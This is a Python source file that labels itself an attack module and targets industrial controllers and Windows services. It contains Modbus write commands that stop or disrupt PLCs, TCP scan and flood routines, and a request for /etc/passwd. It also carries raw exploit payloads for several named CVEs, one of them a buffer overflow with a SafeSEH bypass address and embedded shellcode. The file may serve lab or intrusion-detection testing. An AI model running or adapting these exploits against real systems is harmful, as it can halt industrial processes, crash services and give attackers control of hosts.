from scapy.all import *
from pymodbus.client.sync import ModbusTcpClient
from pymodbus.exceptions import *
import os
import time


time_out = 2


def ping_status_check(target):
    r = os.system('ping %s -n 1 -w 500' %(target,))
    if r == 0:
        return "Online"
    else:
        return "Offline"


def plc_status_check(target):
    client = ModbusTcpClient(target, timeout=time_out)
    try:
        status = client.read_coils(0x00, count=3)
        if status.bits == [1, 0, 0, 0, 0, 0, 0, 0]:
            status = "Running"
        elif status.bits == [0, 1, 0, 0, 0, 0, 0, 0]:
            status = "Idle"
        elif status.bits == [0, 0, 1, 0, 0, 0, 0, 0]:
            status = "Stopped"
        else:
            status = "Broken"
        pass
    except ConnectionException:
        status = "No connection"
        pass
    except(ModbusIOException, ParameterException, ModbusException, InvalidMessageReceivedException,
           MessageRegisterException, NoSuchSlaveException, NotImplementedException):
        status = "Connection was forcibly closed by the remote host"
        pass
    client.close()
    return status


def mb_stop(target):
    client = ModbusTcpClient(target, timeout=time_out)
    try:
        attack = client.write_registers(0x109c, 0)
        status = str(attack)
        pass
    except ConnectionException:
        status = "Error: No connection to target"
        pass
    except(ModbusIOException, ParameterException, ModbusException, InvalidMessageReceivedException,
           MessageRegisterException, NoSuchSlaveException, NotImplementedException):
        status = "Error:" + str(sys.exc_info()[0])
        pass
    client.close()
    return status


def mb_disrupt(target):
    client = ModbusTcpClient(target, timeout=time_out)
    try:
        attack = client.write_coils(0x0000, [1, 1, 1])
        status = str(attack)
    except ConnectionException:
        status = "Error: No connection to target"
    except(ModbusIOException, ParameterException, ModbusException, InvalidMessageReceivedException,
           MessageRegisterException, NoSuchSlaveException, NotImplementedException):
        status = "Error:" + str(sys.exc_info()[0])
        pass
    client.close()
    return status


def mb_restore(target):
    client = ModbusTcpClient(target)
    try:
        attack = client.write_registers(0x109c, 256)
        status = str(attack)
    except ConnectionException:
        status = "Error: No connection to target"
        pass
    except(ModbusIOException, ParameterException, ModbusException, InvalidMessageReceivedException,
           MessageRegisterException, NoSuchSlaveException, NotImplementedException):
        status = "Error:" + str(sys.exc_info()[0])
        pass
    client.close()
    return status


def dos_syn(target):
    dst_port = (1, 3000)
    src_port = RandShort()
    sr1(IP(dst=target) / TCP(sport=src_port, dport=dst_port), timeout=1, verbose=0)
    return "DONE"


def dos_xmas(target):
    dst_port = (1, 3000)
    src_port = RandShort()
    sr1(IP(dst=target) / TCP(sport=src_port, dport=dst_port, flags="FPU"), timeout=1, verbose=0)
    return "DONE"


def malware_eicar(target):
    payload_str = "00 90 e8 6e 33 71 08 00 27 ac 4b 86 08 00 45 00 " \
                  "00 60 00 30 00 00 80 11 00 00 c0 a8 0a 55 c0 a8 " \
                  "0a 0d c0 11 04 d2 00 4c 96 10 58 35 4f 21 50 25 " \
                  "40 41 50 5b 34 5c 50 5a 58 35 34 28 50 5e 29 37 " \
                  "43 43 29 37 7d 24 45 49 43 41 52 2d 53 54 41 4e " \
                  "44 41 52 44 2d 41 4e 54 49 56 49 52 55 53 2d 54 " \
                  "45 53 54 2d 46 49 4c 45 21 24 48 2b 48 2a"
    payload = bytearray.fromhex(payload_str.replace(' ', ''))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(payload, (target, 1234))
    sock.close()
    return "DONE"


def malware_passwd(target):
    payload = bytearray("GET /etc/passwd HTTP/1.1\r\n", 'utf-8')
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    try:
        sock.connect((target, 80))
    except socket.error as exc:
        status = "Connection error: " + str(exc)
    else:
        sock.send(payload)
        sock.close()
        status = ""
    return status


def cve_2015_5374(target):
    payload = bytearray.fromhex('11 49 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 9E'.replace(' ', ''))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(payload, (target, 50000))
    sock.close()
    return "DONE"


def cve_2014_0750(target):
    payload = bytearray("GET /CimWeb/gefebt.exe?\\\\" + target +
                        "\\mHQ\\jsM0.bcl HTTP/1.1\r\n"
                        "Host: 192.168.10.13\r\n"
                        "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n",
                        'utf-8')
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    try:
        sock.connect((target, 80))
    except socket.error as exc:
        status = "Connection error: " + str(exc)
    else:
        sock.send(payload)
        sock.close()
        status = ""
    return status


def cve_2013_0657(target):
    message_header = struct.pack("<L", 0x6014) + bytearray.fromhex("66 66 07 00".replace(' ', ''))
    message_protocol_data = bytearray.fromhex("10 00 00 00 19 00 00 00 00 00 04 00 00 00".replace(' ', ''))
    message_protocol_data += struct.pack(">H", 0x6000)
    padding = bytearray.fromhex("42" * 3344)
    eip_safeseh_bypass_address = struct.pack("<L", 0x0F9C520B)
    nopsleed = bytearray.fromhex("41" * 115)
    shellcode = bytearray.fromhex("dd c4 b8 b7 f6 a5 f0 d9 74 24 f4 5a "
                                  "33 c9 b1 47 31 42 19 03 42 19 83 ea "
                                  "fc 55 03 1e 50 44 33 49 4b be 15 fe "
                                  "4f ca fc ce 46 83 41 b2 b3 1f 70 ee "
                                  "52 dc 29 1f b7 b7 ca 13 c6 d6 49 6c "
                                  "97 66 ba 6b 9c 4e e1 23 af 8c 3c 64 "
                                  "09 c1 e4 f0 2f 6b d5 30 a8 dd cb 2a "
                                  "d9 0c 10 4a 94 88 2e 9c e2 9a 1c e3 "
                                  "53 55 ee ef f3 cc 50 6b 8f 4f 9f 68 "
                                  "39 6a 34 32 c5 81 2c f1 b4 11 b2 b9 "
                                  "a3 2b 9b 42 e5 3a 05 37 b9 18 d4 5e "
                                  "70 18 1c 64 e6 10 42 f3 df 92 ac 2a "
                                  "53 d5 08 22 4d 7f b4 26 77 c7 dd e0 "
                                  "bb 7b b8 f6 e4 63 1e fa 2f 3b ea c0 "
                                  "1d 9c 79 a0 3a ce 32 04 72 56 4e ed "
                                  "37 4f dc 6d dc eb 6d e8 05 3d ed 4a "
                                  "c8 84 47 97 8a 8e 62 53 b2 c0 9b b9 "
                                  "8f d5 a0 7f fc a7 e3 64 87 02 07 d8 "
                                  "44 8e 76 bc bc 6b b2 3d 35 04 7d 2a "
                                  "65 6d b5 0c f5 66 dd 55 cf fc 01 e2 "
                                  "0c ec 51 eb 5d 03 df 27 99 c2 52 01 "
                                  "c6 90 a8 7e 3c 39 a2 26 cb c0 4b 15 "
                                  "3f e0 5a 79 82 83 d1 86 90 49 21 71 "
                                  "89 4e 9b 30 99 47 9a 4a a4 2b b2 ea "
                                  "03 84 8d 32 01 dc 25 cb 42 3e 82 44 "
                                  "fa 22 f1 3c 16 08 9b 28 01".replace(' ', ''))
    junk = bytearray.fromhex("4a554e4b" * 5202)
    payload = message_header + message_protocol_data + padding + eip_safeseh_bypass_address
    payload += nopsleed + shellcode + junk
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((target, 12397))
    except socket.error as exc:
        status = "Connection error: " + str(exc)
    else:
        sock.send(payload)
        time.sleep(3)
        sock.close()
        status = "DONE"
    return status


def cve_2012_0002(target):
    payload = bytearray.fromhex('03 00 00 13 0e e0 00 00 00 00 00 01 00 08 00 00 00 00 00 03 00 00 6a 02 '
                                'f0 80 7f 65 82 00 5e 04 01 01 04 01 01 01 01 ff 30 19 02 01 ff 02 01 ff '
                                '02 01 00 02 01 01 02 01 00 02 01 01 02 02 00 7c 02 01 02 30 19 02 01 ff '
                                '02 01 ff 02 01 00 02 01 01 02 01 00 02 01 01 02 02 00 7c 02 01 02 30 19 '
                                '02 01 ff 02 01 ff 02 01 00 02 01 01 02 01 00 02 01 01 02 02 00 7c 02 01 '
                                '02 04 82 00 00 03 00 00 08 02 f0 80 28 03 00 00 08 02 f0 80 28 03 00 00 '
                                '08 02 f0 80 28 03 00 00 08 02 f0 80 28 03 00 00 08 02 f0 80 28 03 00 00 '
                                '08 02 f0 80 28 03 00 00 08 02 f0 80 28 03 00 00 08 02 f0 80 28 03 00 00 '
                                '0c 02 f0 80 38 00 06 03 f0 03 00 00 09 02 f0 80 21 80'.replace(' ', ''))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    try:
        sock.connect((target, 3389))
    except socket.error as exc:
        status = "Connection error: " + str(exc)
    else:
        sock.send(payload)
        time.sleep(5)
        sock.close()
        status = "DONE"
    return status


def cve_2011_3486(target):
    payload = bytearray.fromhex('03661471' + '0' * 32 + 'f' * 3028)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(payload, (target, 48899))
    sock.close()
    return "DONE"


if __name__ == '__main__':
    print("Attack module v.1.0 by Sever Sudakov")
